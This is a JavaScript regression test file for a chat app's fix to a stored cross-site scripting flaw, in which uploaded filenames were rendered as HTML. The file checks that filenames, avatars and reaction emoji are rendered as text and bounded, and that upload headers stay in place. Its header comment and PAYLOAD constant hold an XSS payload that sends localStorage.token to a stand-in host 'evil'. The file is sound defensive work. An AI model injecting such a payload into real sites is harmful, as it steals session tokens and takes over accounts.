// ── A filename that ran as JavaScript ──────────────────────────────────────
//
// Found reviewing the app for security holes, and it was the real one.
//
// `fileName` arrives in the send_message socket payload and went into the
// database untouched — no length, no character rules, nothing. The web client
// then rendered it:
//
//     a.innerHTML = '📄 ' + (msg.file_name || 'Download file');
//
// So sending a message whose filename was
//
//     <img src=x onerror="fetch('https://evil/'+localStorage.token)">
//
// ran that in the browser of everybody who opened the chat. The session token
// is in localStorage — `let token = localStorage.getItem('token')`, line 1 of
// app.js — so this is a full account takeover, stored, and triggered by doing
// nothing more than reading a message.
//
// Two fixes, and the first is the one that matters: the name is rendered as
// TEXT. The second is these bounds, because the app and the web are two
// clients and there will be more, and a value that cannot be stored cannot be
// mishandled by the next one.
const assert = require('assert');
const fs = require('fs');
const path = require('path');
const ROOT = path.join(__dirname, '..');
const L = require(path.join(ROOT, 'inputLimits.js'));

const tests = [];
const test = (n, f) => tests.push({ n, f });

const PAYLOAD = '<img src=x onerror="fetch(\'https://evil/\'+localStorage.token)">';

test('THE RENDER IS TEXT, which is what actually closes it', () => {
  const app = fs.readFileSync(path.join(ROOT, 'public', 'js', 'app.js'), 'utf8');
  const code = app.split('\n').filter(l => !l.trim().startsWith('//')).join('\n');
  assert.ok(!/innerHTML = '📄 ' \+/.test(code),
    'the filename is built into markup again — this is the account takeover');
  // And what replaced it really is text.
  const i = code.indexOf("a.download = msg.file_name");
  const after = code.slice(i, i + 700);
  assert.ok(/textContent = msg\.file_name/.test(after),
    'the filename is no longer set as text');
});

test('…and so are the other two values a stranger controls', () => {
  const app = fs.readFileSync(path.join(ROOT, 'public', 'js', 'app.js'), 'utf8');
  const code = app.split('\n').filter(l => !l.trim().startsWith('//')).join('\n');
  // An avatar is stored with no check that it is an emoji.
  assert.ok(!/<span>\$\{u\.avatar/.test(code), 'the avatar is interpolated into markup again');
  // A reaction emoji is whatever toggle_reaction was sent.
  assert.ok(!/innerHTML = `\$\{emoji\}/.test(code), 'the reaction emoji is interpolated again');
});

test('A FILENAME IS BOUNDED, and keeps its own alphabet', () => {
  // Bounded because a name of a megabyte is a problem quite apart from any
  // script in it. NOT rewritten, because these names are frequently Persian
  // or Kurdish and mangling somebody's words would be its own bug.
  assert.strictEqual(L.cleanFileName('گزارش.pdf'), 'گزارش.pdf');
  assert.strictEqual(L.cleanFileName('holiday photo.jpg'), 'holiday photo.jpg');
  assert.strictEqual(L.cleanFileName('a'.repeat(500)).length, L.FILE_NAME_MAX);
});

test('…and carries no control characters', () => {
  // A newline or a NUL in a name is never anything but an attempt to confuse
  // something downstream — a log line, a header, a path.
  assert.strictEqual(L.cleanFileName('a\u0000b.pdf'), 'ab.pdf');
  assert.strictEqual(L.cleanFileName('a\nb.pdf'), 'ab.pdf');
  assert.strictEqual(L.cleanFileName('a\u007fb.pdf'), 'ab.pdf');
});

test('THE PAYLOAD IS STILL STORED — and that is correct', () => {
  // This is the point that is easy to get wrong in the other direction. The
  // bounds do NOT try to make dangerous text safe by rewriting it; that is a
  // game nobody wins, and a caller that believes the output is sanitised is
  // worse off than one that knows it is not. Rendering as text is what makes
  // it safe. This only stops the absurd.
  assert.ok(L.cleanFileName(PAYLOAD).includes('<img'),
    'the bounds are pretending to sanitise, which invites somebody to trust them');
});

test('nothing is stored for nothing', () => {
  for (const v of [null, undefined, '', '   ', '\u0000']) {
    assert.strictEqual(L.cleanFileName(v), null, JSON.stringify(v));
  }
  // A non-string is not a crash.
  assert.doesNotThrow(() => L.cleanFileName({}));
  assert.doesNotThrow(() => L.cleanFileName(42));
});

test('AN AVATAR IS ONE EMOJI\'S WORTH', () => {
  assert.strictEqual(L.cleanAvatar('🌵'), '🌵');
  assert.ok(L.cleanAvatar('<script>alert(1)</script>').length <= L.AVATAR_MAX);
  assert.strictEqual(L.cleanAvatar(null), null);
  assert.strictEqual(L.cleanAvatar(''), null);
});

test('A REACTION IS REFUSED, not trimmed', () => {
  // Reactions come from a fixed row of buttons, so anything outside the
  // bounds did not come from the app and there is nothing to salvage.
  assert.strictEqual(L.validEmoji('❤️'), true);
  assert.strictEqual(L.validEmoji('👍'), true);
  assert.strictEqual(L.validEmoji('<img src=x>'), false, 'markup is accepted as a reaction');
  assert.strictEqual(L.validEmoji('a'.repeat(100)), false);
  assert.strictEqual(L.validEmoji(''), false);
  assert.strictEqual(L.validEmoji(null), false);
  assert.strictEqual(L.validEmoji(42), false);
  assert.strictEqual(L.validEmoji('a\u0000b'), false);
});

// ── The wiring ──────────────────────────────────────────────────────────────

const server = fs.readFileSync(path.join(ROOT, 'server.js'), 'utf8');

test('THE SERVER APPLIES THEM WHERE THE VALUE ENTERS', () => {
  assert.ok(/inputLimits\.cleanFileName\(fileName\)/.test(server),
    'a filename still goes into the database exactly as it arrived');
  assert.ok(/inputLimits\.cleanAvatar\(avatar\)/.test(server));
  assert.ok(/inputLimits\.validEmoji\(emoji\)/.test(server));
  // The old unbounded write must be gone.
  assert.ok(!/fileName \|\| null, replyToId/.test(server),
    'the unbounded filename insert is back');
});

test('THE UPLOADS ARE STILL SERVED AS DOWNLOADS', () => {
  // The other half of the same class of bug: an uploaded .html served inline
  // from our own origin would run with access to the token. The headers that
  // prevent it were already there, and this says so out loud so they are not
  // removed as noise by somebody tidying up.
  const i = server.indexOf("app.use('/uploads', express.static");
  assert.ok(i > 0, 'uploads are no longer served by express.static');
  const block = server.slice(i, i + 400);
  assert.ok(/X-Content-Type-Options.*nosniff/s.test(block), 'content sniffing is back on');
  assert.ok(/Content-Disposition.*attachment/s.test(block),
    'uploads render inline again, so an uploaded page runs on our origin');
});

test('AND STILL BEHIND A SIGNATURE, compared in constant time', () => {
  assert.ok(/crypto\.timingSafeEqual/.test(server),
    'the media signature can be probed a byte at a time');
  const i = server.indexOf('function validMediaSig');
  const fn = server.slice(i, server.indexOf('\n}', i));
  assert.ok(/Date\.now\(\) > exp/.test(fn), 'a signed media URL never expires');
});

let passed = 0, failed = 0;
for (const { n, f } of tests) {
  try { f(); console.log(`  ✓ ${n}`); passed++; }
  catch (e) { console.error(`  ✗ ${n}\n      ${e.message}`); failed++; }
}
console.log(`\n${passed} passed, ${failed} failed`);
process.exit(failed ? 1 : 0);
